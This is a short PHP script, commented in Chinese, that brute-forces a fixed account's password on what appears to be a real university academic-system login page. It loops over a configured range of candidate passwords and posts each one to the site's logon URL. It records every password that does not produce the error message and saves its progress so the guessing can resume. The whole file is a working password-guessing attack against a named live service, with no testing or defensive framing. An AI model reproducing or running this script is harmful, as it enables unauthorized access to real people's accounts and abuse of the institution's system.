<?php

include dirname(__FILE__).'/autoload.php';

// 读取配置文件
$ini = parse_ini_file(dirname(__FILE__)."/config/config.ini");
// 账号固定
$account = $ini['account'];
// 密码中可能出现的字符
$chars = $ini['chars'];
// 开始扫描密码 如:123456
$begin = isset($ini['begin']) ? $ini['begin'] : '';
// 结束扫描密码 如:999999
$end = $ini['end'];

// 输出目录
$outDir = dirname(__FILE__).'/out';
// 成功的结果写入result.txt
$resFp = fopen($outDir.'/result.txt', 'a');

// out/begin.txt记录扫描开始密码 如: 123456
$beginPath = $outDir.'/begin.txt';
// 如果记录开始密码的文件已经存在
if (file_exists($beginPath)) {
    $beginFp = fopen($beginPath, 'r');
    $begin = fread($beginFp, 32);
    $begin = rtrim($begin, " \r\n");
    // 关闭读文件指针, 打开新的文件准备写入当前测试的密码
    fclose($beginFp);
}
$beginFp = fopen($beginPath, 'w');

if (!$beginFp) {
    printf("打开文件%s失败".$beginPath);
    exit(1);
}

$codeGen = new CodeGenerator($begin, $end);
$codeGen->process(function($pwd) use ($account, $resFp, $beginFp) {
    $client = new RequestClient();
    // 发包的链接
    $client->setUrl("http://jwxt.cqrk.edu.cn:18080/Logon.do?method=logonByDxfz");

    Logger::write($account."\t".$pwd);

    // 设置发包的用户名密码 字段是 userAccount, userPassword
    $client->post(RequestClient::params([
        'userAccount' => $account,
        'userPassword' => $pwd
    ]));
    $resp = $client->getResponseBody();
    Logger::write($client->getResponseBody());

    if (strcmp($resp, "账号或密码输入错误!")===0) {
        echo $account."\t".$pwd."\t错误\n";
    } else{
        echo $pwd.'密码正确';
        fwrite($resFp, $account."\t".$pwd."\r\n");
    }
    // 记录当前运行到了哪个密码
    fseek($beginFp, 0);
    fwrite($beginFp, $pwd);
});

fclose($resFp);
